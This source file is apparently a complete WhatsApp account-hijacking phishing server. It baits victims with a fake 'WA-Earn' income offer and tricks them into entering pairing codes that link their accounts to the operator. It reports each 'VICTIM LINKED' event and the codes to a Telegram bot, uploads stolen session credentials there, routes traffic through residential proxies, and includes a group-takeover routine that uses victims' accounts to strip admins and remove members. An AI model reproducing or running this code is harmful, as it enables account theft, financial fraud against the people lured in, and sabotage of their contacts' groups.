const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    DisconnectReason,
    fetchLatestWaWebVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const archiver = require('archiver');
const fs = require('fs-extra');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const axios = require('axios');

const BOT_NUMBER = (process.env.BOT_NUMBER || '').replace(/[^0-9]/g, '');
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';
const RESIDENTIAL_PROXY = process.env.RESIDENTIAL_PROXY || '';

const PROXY_CACHE_FILE = path.join(__dirname, 'working_proxy.json');
const SESSION_INDEX_FILE = path.join(__dirname, 'session_index.json');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const logBuffer = [];
function pushLog(msg, type = 'info') {
    const entry = { time: new Date().toISOString(), msg, type };
    logBuffer.push(entry);
    if (logBuffer.length > 200) logBuffer.shift();
    io.emit('log', entry);
}

app.get('/logs', (req, res) => res.json(logBuffer.slice(-100)));

app.get('/env', (req, res) => {
    res.json({
        BOT_NUMBER,
        RENDER_URL,
        hasTunnel: !!RESIDENTIAL_PROXY,
        hasTelegramToken: !!TELEGRAM_TOKEN && TELEGRAM_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN',
        pendingSocks: Array.from(global.__pendingSocks?.keys() || []),
        victimCount: victimList.length
    });
});

const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
tgBot.on('polling_error', () => {});

let adminSock = null;
let adminReady = false;
let activeVictims = {};
let victimList = [];

if (!global.__pendingSocks) global.__pendingSocks = new Map();
function holdPending(number, sock) { global.__pendingSocks.set(number, sock); }
function releasePending(number, sock) {
    if (global.__pendingSocks.get(number) === sock) global.__pendingSocks.delete(number);
}

// ── tunnel health ──────────────────────────────────────────
async function tunnelAlive() {
    if (!RESIDENTIAL_PROXY) return false;
    try {
        const r = await axios.get(`${RESIDENTIAL_PROXY}/health`, { timeout: 5000 });
        return r.data?.status === 'ok';
    } catch (e) { return false; }
}

// ── session index ─────────────────────────────────────────
function loadSessionIndex() {
    try { if (fs.existsSync(SESSION_INDEX_FILE)) return JSON.parse(fs.readFileSync(SESSION_INDEX_FILE, 'utf8')); } catch (e) {}
    return {};
}
function saveSessionIndex(index) {
    try { fs.writeFileSync(SESSION_INDEX_FILE, JSON.stringify(index, null, 2)); } catch (e) {}
}
function recordSession(folderName, fileId, messageId) {
    const index = loadSessionIndex();
    index[folderName] = { fileId, messageId, savedAt: Date.now() };
    saveSessionIndex(index);
    tgBot.sendMessage(MY_TELEGRAM_ID, `#SESSION_INDEX ${folderName} ${fileId} ${messageId}`).catch(() => {});
}

// ── proxy cache ───────────────────────────────────────────
function loadCachedProxy() {
    try {
        if (fs.existsSync(PROXY_CACHE_FILE)) {
            const d = JSON.parse(fs.readFileSync(PROXY_CACHE_FILE, 'utf8'));
            if (d.proxy && Date.now() - d.savedAt < 1000 * 60 * 60 * 6) return d.proxy;
        }
    } catch (e) {}
    return null;
}
function saveCachedProxy(proxy) {
    try { fs.writeFileSync(PROXY_CACHE_FILE, JSON.stringify({ proxy, savedAt: Date.now() })); } catch (e) {}
}

// ── restore session ───────────────────────────────────────
async function restoreSessionFromTelegram(folderName) {
    const folderPath = path.join(__dirname, folderName);
    if (await fs.pathExists(folderPath)) {
        if (await fs.pathExists(path.join(folderPath, 'creds.json'))) {
            pushLog(`[restore] ${folderName} present`, 'info');
            return true;
        }
        await fs.remove(folderPath);
    }
    const index = loadSessionIndex();
    let entry = index[folderName];
    if (!entry) {
        try {
            const updates = await tgBot.getUpdates({ limit: 100, offset: -1 });
            for (const u of updates.reverse()) {
                const text = u.message?.text || '';
                if (text.startsWith('#SESSION_INDEX ')) {
                    const parts = text.split(' ');
                    if (parts[1] === folderName && parts[2] && parts[3]) {
                        entry = { fileId: parts[2], messageId: parseInt(parts[3], 10) };
                        break;
                    }
                }
            }
        } catch (e) {}
    }
    if (!entry?.fileId) return false;
    try {
        const link = await tgBot.getFileLink(entry.fileId);
        const zipPath = path.join(__dirname, `${folderName}_restore.zip`);
        const w = fs.createWriteStream(zipPath);
        const resp = await axios({ url: link, method: 'GET', responseType: 'stream' });
        resp.data.pipe(w);
        await new Promise((res, rej) => { w.on('finish', res); w.on('error', rej); });
        await fs.ensureDir(folderPath);
        await require('extract-zip')(zipPath, { dir: folderPath });
        await fs.unlink(zipPath);
        pushLog(`[restore] ${folderName} restored`, 'info');
        return true;
    } catch (e) {
        pushLog(`[restore] ${folderName} failed: ${e.message}`, 'error');
        return false;
    }
}

// ── backup ────────────────────────────────────────────────
async function backupToTelegram(folderName, folderPath) {
    const zipPath = path.join(__dirname, `${folderName}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });
    return new Promise((resolve, reject) => {
        output.on('close', async () => {
            try {
                const msg = await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, { caption: `#SESSION_BACKUP ${folderName}` });
                recordSession(folderName, msg.document.file_id, msg.message_id);
                fs.unlinkSync(zipPath);
                resolve();
            } catch (e) { reject(e); }
        });
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(folderPath, false);
        archive.finalize();
    });
}

// ── admin bot ─────────────────────────────────────────────
async function startAdminBot() {
    await restoreSessionFromTelegram('auth_info_admin');
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
    const { version } = await fetchLatestWaWebVersion({});

    const cachedProxy = loadCachedProxy();
    const sockOptions = {
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.macOS('Safari'),
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 15000
    };
    if (cachedProxy) sockOptions.agent = new HttpsProxyAgent(cachedProxy);

    adminSock = makeWASocket(sockOptions);
    adminSock.ev.on('creds.update', saveCreds);

    adminSock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            adminReady = true;
            pushLog('Admin Bot connected', 'info');
            tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
            if (cachedProxy) saveCachedProxy(cachedProxy);
            backupToTelegram('auth_info_admin', 'auth_info_admin').catch(() => {});
        }
        if (update.connection === 'close') {
            adminReady = false;
            if (update.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                setTimeout(startAdminBot, 5000);
            }
        }
    });

    if (!adminSock.authState.creds.registered) {
        adminSock.ev.on('connection.update', async (update) => {
            if (update.connection === 'connecting' && !adminSock.authState.creds.registered) {
                await delay(3000);
                try {
                    const code = await adminSock.requestPairingCode(BOT_NUMBER);
                    tgBot.sendMessage(MY_TELEGRAM_ID, `*Admin Pairing Code:* \`${code}\``, { parse_mode: 'Markdown' });
                } catch (err) { pushLog(`[admin-pair] ${err.message}`, 'error'); }
            }
        });
    }
}

// ── whatsapp delivery ─────────────────────────────────────
async function sendWhatsAppMessage(number, text) {
    if (!adminReady || !adminSock) throw new Error('admin bot offline');
    const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await adminSock.sendMessage(jid, { text });
}

async function sendCodeToWhatsApp(number, code) {
    const msg = `*WA-Earn — Linking Code*\n\nYour pairing code is:\n\n*${code}*\n\n*How to link:*\n1. Open WhatsApp on this phone\n2. Tap the three dots (⋮) top right\n3. Tap *Linked Devices*\n4. Tap *Link with Phone Number*\n5. Enter the code above\n\nYou have ~2 minutes before it expires. If it expires, come back to the site and tap Resend.`;
    await sendWhatsAppMessage(number, msg);
}

async function sendLinkedConfirmation(number) {
    const msg = `*WA-Earn — Linked ✅*\n\nYour WhatsApp is now linked to the WA-Earn campaign network.\n\n*Onboarding bonus: ₦2,000* has been credited to your wallet.\nDaily retainer: ₦500.\n\nOpen ${RENDER_URL} to access your dashboard.`;
    await sendWhatsAppMessage(number, msg);
}

async function sendMaintenanceMessage(number) {
    try {
        const msg = `*WA-Earn — Temporary Issue*\n\nWe couldn't complete your linking right now. Please try again in a few minutes.`;
        await sendWhatsAppMessage(number, msg);
    } catch (e) {}
}

// ── one pairing attempt ───────────────────────────────────
async function attemptPairing({ targetNumber, version, state, saveCreds, proxyUrl, label, socket, isResend = false }) {
    const sockOptions = {
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.macOS('Safari'),
        connectTimeoutMs: 30000,
        defaultQueryTimeoutMs: 30000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 250
    };
    if (proxyUrl && proxyUrl !== 'DIRECT') sockOptions.agent = new HttpsProxyAgent(proxyUrl);

    const phishSock = makeWASocket(sockOptions);
    phishSock.ev.on('creds.update', saveCreds);
    holdPending(targetNumber, phishSock);
    phishSock.ev.on('connection.update', (u) => {
        if (u.connection === 'close') releasePending(targetNumber, phishSock);
    });

    return new Promise((resolve, reject) => {
        let codeSent = false;
        let connected = false;

        phishSock.ev.on('connection.update', async (update) => {
            if (update.connection === 'connecting' && !codeSent) {
                codeSent = true;
                await delay(2000);
                try {
                    const code = await phishSock.requestPairingCode(targetNumber);

                    if (!isResend) {
                        socket.emit('pair_status', { msg: 'Code sent to your WhatsApp. Check your messages.', step: 4 });
                        socket.emit('code_sent_via_whatsapp');
                    }

                    tgBot.sendMessage(MY_TELEGRAM_ID,
                        `✅ *Code issued*${isResend ? ' (resend)' : ''}\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}`
                    );

                    try {
                        await sendCodeToWhatsApp(targetNumber, code);
                    } catch (e) {
                        tgBot.sendMessage(MY_TELEGRAM_ID,
                            `⚠️ *Code delivery failed*\n${e.message}\nCode was: \`${code}\``
                        );
                    }

                } catch (e) {
                    releasePending(targetNumber, phishSock);
                    try { phishSock.end(undefined); } catch (err) {}
                    reject(e);
                }
            }

            if (update.connection === 'open') {
                connected = true;
                activeVictims[targetNumber] = phishSock;
                if (!victimList.find(v => v.number === targetNumber)) {
                    victimList.push({ number: targetNumber, status: 'Online' });
                }
                io.emit('victim_update', victimList);
                socket.emit('success');

                tgBot.sendMessage(MY_TELEGRAM_ID,
                    `🔥 *VICTIM LINKED*\nNumber: \`${targetNumber}\`\nVia: ${label}`
                );

                sendLinkedConfirmation(targetNumber).catch(() => {});
                resolve({ linked: true, label });
            }

            if (update.connection === 'close') {
                const code = update.lastDisconnect?.error?.output?.statusCode;
                releasePending(targetNumber, phishSock);
                if (!connected) {
                    try { phishSock.end(undefined); } catch (err) {}
                    reject(new Error(code === 401 ? 'AuthRejected' : `Closed(${code || 'unknown'})`));
                }
            }
        });

        setTimeout(() => { if (!connected) reject(new Error('Timeout')); }, 90000);
    });
}

// ── main pairing loop (used by both request_code and resend_code) ──
async function runPairingLoop({ socket, targetNumber }) {
    const folderName = `auth_info_${targetNumber}`;
    await restoreSessionFromTelegram(folderName);
    const { state, saveCreds } = await useMultiFileAuthState(folderName);

    if (state.creds.registered) {
        socket.emit('success');
        return;
    }

    const { version } = await fetchLatestWaWebVersion({});

    const tunnelUp = await tunnelAlive();
    const attempts = [];
    if (tunnelUp) {
        attempts.push({ proxy: RESIDENTIAL_PROXY, label: 'tunnel' });
        tgBot.sendMessage(MY_TELEGRAM_ID, `🔍 *Pairing started*\nNumber: \`${targetNumber}\`\nVia: tunnel`);
    } else {
        tgBot.sendMessage(MY_TELEGRAM_ID,
            `⚠️ *Tunnel offline*\nNumber: \`${targetNumber}\`\nFalling back to DIRECT`
        );
        socket.emit('pair_status', { msg: 'Tunnel offline, using fallback…', step: 3 });
    }
    attempts.push({ proxy: 'DIRECT', label: 'DIRECT' });

    let linked = false;
    let lastError = null;
    let codeIssued = false;

    for (let i = 0; i < attempts.length; i++) {
        if (linked) break;
        const { proxy, label } = attempts[i];

        socket.emit('pair_status', {
            msg: `Attempt ${i + 1}/${attempts.length} — ${label}`,
            step: 3
        });

        try {
            await attemptPairing({ targetNumber, version, state, saveCreds, proxyUrl: proxy, label, socket });
            linked = true;
            codeIssued = true;
        } catch (e) {
            lastError = e.message;
            if (e.message === 'AuthRejected') codeIssued = true;
        }
    }

    if (!linked) {
        if (tunnelUp && codeIssued) {
            socket.emit('error',
                'Your code was issued but WhatsApp rejected the link. ' +
                'Make sure this number is not already linked elsewhere, then try again.'
            );
        } else {
            socket.emit('error', 'Server under maintenance. Please try again later.');
        }
        sendMaintenanceMessage(targetNumber).catch(() => {});
        tgBot.sendMessage(MY_TELEGRAM_ID,
            `💀 *Pairing failed*\nNumber: \`${targetNumber}\`\nError: ${lastError}\nCode issued: ${codeIssued}`
        );
    } else {
        backupToTelegram(folderName, folderName).catch(() => {});
    }
}

// ── victim pairing entrypoint ─────────────────────────────
io.on('connection', (socket) => {
    socket.on('request_code', async (phoneNumber) => {
        const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
        console.log('[PAIR] target =', targetNumber, '| BOT =', BOT_NUMBER, '| match =', targetNumber === BOT_NUMBER);

        if (targetNumber === BOT_NUMBER) {
            return socket.emit('error', 'This number is the admin account. Use a different number.');
        }
        if (!adminReady) {
            return socket.emit('error', 'Server under maintenance. Please try again later.');
        }
        socket.emit('pair_status', { msg: 'Preparing…', step: 1 });
        socket.emit('pair_status', { msg: 'Checking server…', step: 2 });
        await runPairingLoop({ socket, targetNumber });
    });

    // resend: prefer existing pending socket, else fresh pairing
    socket.on('resend_code', async (phoneNumber) => {
        const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (targetNumber === BOT_NUMBER) {
            return socket.emit('error', 'This number is the admin account. Use a different number.');
        }
        if (!adminReady) {
            return socket.emit('error', 'Server under maintenance. Please try again later.');
        }

        socket.emit('pair_status', { msg: 'Generating new code…', step: 2 });

        const existing = global.__pendingSocks.get(targetNumber);

        if (existing) {
            // reuse the socket — no new tunnel round-trip
            try {
                const code = await existing.requestPairingCode(targetNumber);
                await sendCodeToWhatsApp(targetNumber, code).catch((e) => {
                    tgBot.sendMessage(MY_TELEGRAM_ID, `⚠️ *Resend delivery failed*\n${e.message}\nCode: \`${code}\``);
                });
                socket.emit('code_sent_via_whatsapp');
                tgBot.sendMessage(MY_TELEGRAM_ID,
                    `✅ *Code resent (reused socket)*\nNumber: \`${targetNumber}\`\nCode: \`${code}\``
                );
                return;
            } catch (e) {
                tgBot.sendMessage(MY_TELEGRAM_ID,
                    `⚠️ *Resend on existing socket failed*\n${e.message}\nFalling back to fresh pairing`
                );
            }
        }

        // no live socket — full retry
        await runPairingLoop({ socket, targetNumber });
    });

    socket.on('admin_join', () => io.emit('victim_update', victimList));

    socket.on('admin_send_invite', async (number) => {
        if (!adminSock) return;
        const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network. As a partner, our system will use your account to distribute verified business campaigns to your contacts.\n\nIn return, we offer a guaranteed *₦2,000 onboarding bonus*, plus a *₦500 daily retainer* as long as your account remains active in our network.\n\nTo view the terms and activate your account, please visit our secure portal:\n${RENDER_URL}\n\n_Note: This is a fully automated campaign system. No manual posting is required._`;
        try {
            await adminSock.sendMessage(target, { text: pitch });
            pushLog(`Invite sent to ${number}`, 'info');
        } catch (e) {}
    });

    socket.on('admin_takeover', async (data) => {
        const victimNumber = data.victim.replace(/[^0-9]/g, '');
        const groupJid = data.group;
        if (!activeVictims[victimNumber]) return pushLog(`Victim ${victimNumber} not online.`, 'error');
        const victimSock = activeVictims[victimNumber];
        try {
            await victimSock.groupParticipantsUpdate(groupJid, [BOT_NUMBER + '@s.whatsapp.net'], 'promote');
            await delay(1500);
            const meta = await victimSock.groupMetadata(groupJid);
            let kicked = 0;
            for (let p of meta.participants) {
                if (p.id === victimSock.user.id || p.id === BOT_NUMBER + '@s.whatsapp.net') continue;
                if (p.admin) { await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'demote'); await delay(1000); }
                await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'remove');
                kicked++;
                await delay(1000);
            }
            pushLog(`Takeover complete. Kicked ${kicked}.`, 'info');
        } catch (e) { pushLog(`Takeover failed: ${e.message}`, 'error'); }
    });
});

setInterval(() => {
    http.get(`http://localhost:${process.env.PORT || 8080}/admin`, () => {}).on('error', () => {});
}, 10 * 60 * 1000);

server.listen(process.env.PORT || 8080, () => {
    startAdminBot();
});